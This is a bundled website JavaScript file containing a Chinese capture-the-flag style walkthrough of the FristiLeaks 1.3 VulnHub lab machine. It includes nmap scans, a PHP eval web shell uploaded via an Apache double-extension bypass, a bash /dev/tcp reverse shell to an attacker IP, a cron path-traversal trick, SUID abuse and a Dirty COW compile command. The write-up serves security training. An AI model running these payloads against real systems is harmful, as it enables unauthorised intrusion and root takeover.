"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5824],{28453:(n,r,e)=>{e.d(r,{R:()=>o,x:()=>a});var s=e(96540);const i={},t=s.createContext(i);function o(n){const r=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(r):{...r,...n}}),[r,n])}function a(n){let r;return r=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:o(n.components),s.createElement(t.Provider,{value:r},n.children)}},97188:(n,r,e)=>{e.r(r),e.d(r,{assets:()=>d,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/FristiLeaks_1.3","title":"FristiLeaks_1.3","description":"\u9776\u673a\u5b89\u88c5","source":"@site/docs/VulnHub/Virtual Machines/FristiLeaks_1.3.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/FristiLeaks_1.3","permalink":"/docs/VulnHub/Virtual Machines/FristiLeaks_1.3","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/FristiLeaks_1.3.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"FALL","permalink":"/docs/VulnHub/Virtual Machines/FALL"},"next":{"title":"HackLAB Vulnix","permalink":"/docs/VulnHub/Virtual Machines/HackLAB Vulnix"}}');var i=e(74848),t=e(28453);const o={},a=void 0,d={},c=[{value:"\u9776\u673a\u5b89\u88c5",id:"\u9776\u673a\u5b89\u88c5",level:3},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u7aef\u6e17\u900f",id:"web\u7aef\u6e17\u900f",level:3},{value:"\u540e\u53f0\u767b\u5f55",id:"\u540e\u53f0\u767b\u5f55",level:4},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"\u810f\u725b\u63d0\u6743",id:"\u810f\u725b\u63d0\u6743",level:4}];function l(n){const r={a:"a",blockquote:"blockquote",code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,t.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(r.h3,{id:"\u9776\u673a\u5b89\u88c5",children:"\u9776\u673a\u5b89\u88c5"}),"\n",(0,i.jsxs)(r.blockquote,{children:["\n",(0,i.jsxs)(r.p,{children:["\u4fee\u6539mac\u4e3a\uff1a",(0,i.jsx)(r.code,{children:"08:00:27:A5:A6:76"})]}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.a,{href:"http://blog.chinaunix.net/uid-22141042-id-1789609.html",children:"http://blog.chinaunix.net/uid-22141042-id-1789609.html"})}),"\n"]}),"\n",(0,i.jsx)(r.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Fri Nov  8 04:15:01 2024 as: nmap -sT --min-rate 5000 -p- -oN nmapscan/port_scan 192.168.56.129\r\nNmap scan report for 192.168.56.129\r\nHost is up (0.0067s latency).\r\nNot shown: 65502 filtered tcp ports (no-response), 32 filtered tcp ports (host-unreach)\r\nPORT   STATE SERVICE\r\n80/tcp open  http\r\nMAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Fri Nov  8 04:42:42 2024 as: nmap --script=vuln -p80 -oN nmapscan/script_scan memegenerator.net\r\nNmap scan report for memegenerator.net (192.168.56.129)\r\nHost is up (0.00040s latency).\r\n\r\nPORT   STATE SERVICE\r\n80/tcp open  http\r\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\r\n|_http-trace: TRACE is enabled\r\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\r\n| http-slowloris-check: \r\n|   VULNERABLE:\r\n|   Slowloris DOS attack\r\n|     State: LIKELY VULNERABLE\r\n|     IDs:  CVE:CVE-2007-6750\r\n|       Slowloris tries to keep many connections to the target web server open and hold\r\n|       them open as long as possible.  It accomplishes this by opening connections to\r\n|       the target web server and sending a partial request. By doing so, it starves\r\n|       the http server's resources causing Denial Of Service.\r\n|       \r\n|     Disclosure date: 2009-09-17\r\n|     References:\r\n|       http://ha.ckers.org/slowloris/\r\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\r\n|_http-dombased-xss: Couldn't find any DOM based XSS.\r\n| http-enum: \r\n|   /robots.txt: Robots file\r\n|   /icons/: Potentially interesting folder w/ directory listing\r\n|_  /images/: Potentially interesting folder w/ directory listing\r\nMAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,i.jsx)(r.h3,{id:"web\u7aef\u6e17\u900f",children:"web\u7aef\u6e17\u900f"}),"\n",(0,i.jsxs)(r.p,{children:["\u67e5\u770b",(0,i.jsx)(r.code,{children:"robots.txt"})]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"User-agent: *\r\nDisallow: /cola\r\nDisallow: /sisi\r\nDisallow: /beer\n"})}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108201405201.png",alt:"image-20241108201405201"})}),"\n",(0,i.jsxs)(r.p,{children:["\u4e09\u4e2a\u76ee\u5f55\u90fd\u662f\u8fd9\u5f20\u56fe\u7247\uff0c\u6307\u5411",(0,i.jsx)(r.code,{children:"memegenerator.net"}),"\u57df\u540d"]}),"\n",(0,i.jsx)(r.p,{children:"\u505a\u4e86\u4e2ahost\u89e3\u6790\uff0c\u626b\u76ee\u5f55\u6ca1\u6709\u4ec0\u4e48\u6536\u83b7"}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108201921571.png",alt:"image-20241108201921571"})}),"\n",(0,i.jsxs)(r.p,{children:["\u8981\u62fc\u63a5",(0,i.jsx)(r.code,{children:"fristi"}),"\u76ee\u5f55"]}),"\n",(0,i.jsx)(r.h4,{id:"\u540e\u53f0\u767b\u5f55",children:"\u540e\u53f0\u767b\u5f55"}),"\n",(0,i.jsxs)(r.blockquote,{children:["\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.a,{href:"http://192.168.56.129/fristi/",children:"http://192.168.56.129/fristi/"})}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108202006213.png",alt:"image-20241108202006213"})}),"\n",(0,i.jsx)(r.p,{children:"\u67e5\u770b\u6e90\u7801\u7ed9\u7684\u63d0\u793a"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"\x3c!-- \r\nTODO:\r\nWe need to clean this up for production. I left some junk in here to make testing easier.\r\n\r\n- by eezeepz\r\n--\x3e\n"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"\x3c!-- \r\niVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx\r\njwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl\r\nS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw\r\nB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f\r\nm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ\r\nZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb\r\nDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd\r\njJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU\r\n12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5\r\nuvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1\r\n04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq\r\ni1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg\r\ntOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws\r\n30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl\r\n3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK\r\nul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q\r\nmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34\r\nrPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe\r\nEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH\r\nAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk\r\nCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR\r\nU5ErkJggg==\r\n--\x3e\n"})}),"\n",(0,i.jsx)(r.p,{children:"base64\u8f6c\u56fe\u7247"}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108202154667.png",alt:"image-20241108202154667"})}),"\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"keKkeKKeKKeKkEkkEk"}),"\u62ff\u5230\u7684\u50cf\u662f\u4e00\u4e2a\u5bc6\u7801"]}),"\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"eezeepz"}),"\u662f\u4e00\u4e2a\u7528\u6237"]}),"\n",(0,i.jsx)(r.p,{children:"\u767b\u5f55\u6210\u529f"}),"\n",(0,i.jsx)(r.p,{children:"\u7136\u540e\u662f\u4e00\u4e2a\u4e0a\u4f20\u9875\u9762\uff0c\u767d\u540d\u5355\u8fc7\u6ee4"}),"\n",(0,i.jsxs)(r.blockquote,{children:["\n",(0,i.jsx)(r.p,{children:"Apache HTTPD\u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(r.p,{children:["\u7531\u4e8eApache HTTPD\u652f\u6301\u4e00\u4e2a\u6587\u4ef6\u62e5\u6709\u591a\u4e2a\u540e\u7f00\uff0c\u5e76\u4e3a\u4e0d\u540c\u540e\u7f00\u6267\u884c\u4e0d\u540c\u7684\u6307\u4ee4\u3002\u6240\u4ee5\u5982\u679c\u7ba1\u7406\u5458\u7ed9.",(0,i.jsx)(r.code,{children:"php"}),"\u540e\u7f00\u589e\u52a0\u4e86\u5904\u7406\u5668"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{children:"AddHandler application/x-httpd-php .php\n"})}),"\n",(0,i.jsx)(r.p,{children:"\u90a3\u4e48\uff0c\u5728\u6709\u591a\u4e2a\u540e\u7f00\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u8981\u4e00\u4e2a\u6587\u4ef6\u542b\u6709.php\u540e\u7f00\u5c31\u4f1a\u88ab\u8bc6\u522b\u6210PHP\u6587\u4ef6\uff0c\u4e14\u6ca1\u5fc5\u8981\u662f\u6700\u540e\u4e00\u4e2a\u540e\u7f00\u3002\u8fd9\u4e2a\u7279\u6027\u5c31\u4f1a\u5f62\u6210\u4e00\u4e2a\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u4f20\u767d\u540d\u5355\u7684\u89e3\u6790\u6f0f\u6d1e\u3002"}),"\n"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-http",children:'POST /fristi/do_upload.php HTTP/1.1\r\nHost: 192.168.56.129\r\nReferer: http://192.168.56.129/fristi/upload.php\r\nOrigin: http://192.168.56.129\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryOsy32JrRFP2cnWer\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\r\nCookie: PHPSESSID=7937dtrhtfs2837md4b43n8i01\r\nContent-Length: 334\r\n\r\n------WebKitFormBoundaryOsy32JrRFP2cnWer\r\nContent-Disposition: form-data; name="fileToUpload"; filename="1.php.png"\r\nContent-Type: image/png\r\n\r\nGIF89a\r\n<?php eval($_POST[1]);?>\r\n\r\n\r\n------WebKitFormBoundaryOsy32JrRFP2cnWer\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload Image\r\n------WebKitFormBoundaryOsy32JrRFP2cnWer--\n'})}),"\n",(0,i.jsx)(r.p,{children:"\u62ff\u5230webshell"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:"/bin/sh -i >& /dev/tcp/192.168.56.128/1234 0>&1\n"})}),"\n",(0,i.jsx)(r.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsxs)(r.p,{children:["\u5728",(0,i.jsx)(r.code,{children:"/home/eezeepz"}),"\u76ee\u5f55\u4e0b\uff0c\u6709\u4e2a",(0,i.jsx)(r.code,{children:"note.txt"})]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-sh",children:'sh-4.1$ cat notes.txt\r\ncat notes.txt\r\nYo EZ,\r\n\r\nI made it possible for you to do some automated checks, \r\nbut I did only allow you access to /usr/bin/* system binaries. I did\r\nhowever copy a few extra often needed commands to my \r\nhomedir: chmod, df, cat, echo, ps, grep, egrep so you can use those\r\nfrom /home/admin/\r\n\r\nDon\'t forget to specify the full path for each binary!\r\n\r\nJust put a file called "runthis" in /tmp/, each line one command. The \r\noutput goes to the file "cronresult" in /tmp/. It should \r\nrun every minute with my account privileges.\r\n\r\n- Jerry\n'})}),"\n",(0,i.jsxs)(r.p,{children:["\u610f\u601d\u662f\uff1a\u53ea\u80fd\u7528",(0,i.jsx)(r.code,{children:"/usr/bin"}),"\u4e0b\u7684\u6587\u4ef6\uff0c\u5728",(0,i.jsx)(r.code,{children:"/tmp"}),"\u76ee\u5f55\u521b\u5efa",(0,i.jsx)(r.code,{children:"runthis"}),"\u6587\u4ef6\uff0c\u7136\u540e",(0,i.jsx)(r.code,{children:"admin"}),"\u7528\u6237\u4f1a\u6bcf\u4e00\u5206\u949f\u8fd0\u884c\u5b83"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"echo '/usr/bin/../../bin/chmod 777 /home/admin' > runthis\n"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"sh-4.1$ echo '/usr/bin/../../bin/chmod 777 /home/admin' > runthis\r\necho '/usr/bin/../../bin/chmod 777 /home/admin' > runthis\r\nsh-4.1$ ls -l /home/admin\r\nls -l /home/admin\r\ntotal 632\r\n-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat\r\n-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod\r\n-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py\r\n-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt\r\n-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py\r\n-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df\r\n-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo\r\n-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep\r\n-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep\r\n-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps\r\n-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt\n"})}),"\n",(0,i.jsx)(r.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u67e5\u770b\u8be5\u76ee\u5f55"}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.code,{children:"cronjob.py"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-python",children:"import os\r\n\r\ndef writefile(str):\r\n    with open('/tmp/cronresult','a') as er:\r\n        er.write(str)\r\n        er.close()\r\n\r\nwith open('/tmp/runthis','r') as f:\r\n    for line in f:\r\n        #does the command start with /home/admin or /usr/bin?\r\n        if line.startswith('/home/admin/') or line.startswith('/usr/bin/'):\r\n            #lets check for pipeline\r\n            checkparams= '|&;'\r\n            if checkparams in line:\r\n                writefile(\"Sorry, not allowed to use |, & or ;\")\r\n                exit(1)\r\n            else:\r\n                writefile(\"executing: \"+line)\r\n                result =os.popen(line).read()\r\n                writefile(result)\r\n        else:\r\n            writefile(\"command did not start with /home/admin or /usr/bin\")\n"})}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.code,{children:"cryptpass.py"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-python",children:"#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn\r\nimport base64,codecs,sys\r\n\r\ndef encodeString(str):\r\n    base64string= base64.b64encode(str)\r\n    return codecs.encode(base64string[::-1], 'rot13')\r\n\r\ncryptoResult=encodeString(sys.argv[1])\r\nprint cryptoResult\n"})}),"\n",(0,i.jsx)(r.p,{children:"\u5148\u662fBase64\u7f16\u7801\uff0c\u7136\u540e\u662fROT13\u7f16\u7801\u3002\u6700\u540e\uff0c\u5b83\u6253\u5370\u51fa\u7f16\u7801\u540e\u7684\u7ed3\u679c"}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.code,{children:"whoisyourgodnow.txt"})}),"\n",(0,i.jsxs)(r.blockquote,{children:["\n",(0,i.jsx)(r.p,{children:"=RFn0AKnlMHMPIzpyuTI0ITG"}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108204617477.png",alt:"image-20241108204617477"})}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.code,{children:"LetThereBeFristi!"})}),"\n",(0,i.jsxs)(r.p,{children:["\u767b\u5f55\u7528\u6237",(0,i.jsx)(r.code,{children:"fristigod"})]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"sh-4.1$ su fristigod\r\nsu fristigod\r\nstandard in must be a tty\r\nsh-4.1$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\r\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\r\nbash-4.1$ su fristigod\r\nsu fristigod\r\nPassword: LetThereBeFristi!\r\n\r\nbash-4.1$ id\r\nid\r\nuid=502(fristigod) gid=502(fristigod) groups=502(fristigod)\n"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"bash-4.1$ ls -al\r\nls -al\r\ntotal 16\r\ndrwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .\r\ndrwxr-xr-x. 19 firefart  root      4096 Nov 19  2015 ..\r\n-rw-------   1 fristigod fristigod 1026 Nov  8 07:25 .bash_history\r\ndrwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff\r\nbash-4.1$ cd .secret_admin_stuff\r\ncd .secret_admin_stuff\r\nbash-4.1$ ls\r\nls\r\ndoCom\r\nbash-4.1$ ls -la\r\nls -la\r\ntotal 16\r\ndrwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .\r\ndrwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..\r\n-rwsr-sr-x  1 firefart  root      7529 Nov 25  2015 doCom\r\nbash-4.1$ file doCom\r\nfile doCom\r\ndoCom: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped\n"})}),"\n",(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"doCom"}),"\u6709suid\u6743\u9650\uff0c\u4e14\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6"]}),"\n",(0,i.jsx)(r.p,{children:(0,i.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241108205312565.png",alt:"image-20241108205312565"})}),"\n",(0,i.jsxs)(r.p,{children:["\u9996\u5148\u5224\u65aduid\u662f\u5426\u662f",(0,i.jsx)(r.code,{children:"503"}),",\u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u547d\u4ee4"]}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"bash-4.1$ sudo -u fristi ./doCom id\r\nsudo -u fristi ./doCom id\r\n[sudo] password for fristigod: LetThereBeFristi!\r\n\r\nuid=0(firefart) gid=100(users) groups=100(users),502(fristigod)\r\nbash-4.1$ sudo -u fristi ./doCom bash\r\nsudo -u fristi ./doCom bash\n"})}),"\n",(0,i.jsx)(r.p,{children:"\u6210\u529f\u62ff\u5230root"}),"\n",(0,i.jsx)(r.h4,{id:"\u810f\u725b\u63d0\u6743",children:"\u810f\u725b\u63d0\u6743"}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"gcc -pthread 40839.c -o dirty -lcrypt\n"})}),"\n",(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-bash",children:"./dirty\n"})})]})}function h(n={}){const{wrapper:r}={...(0,t.R)(),...n.components};return r?(0,i.jsx)(r,{...n,children:(0,i.jsx)(l,{...n})}):l(n)}}}]);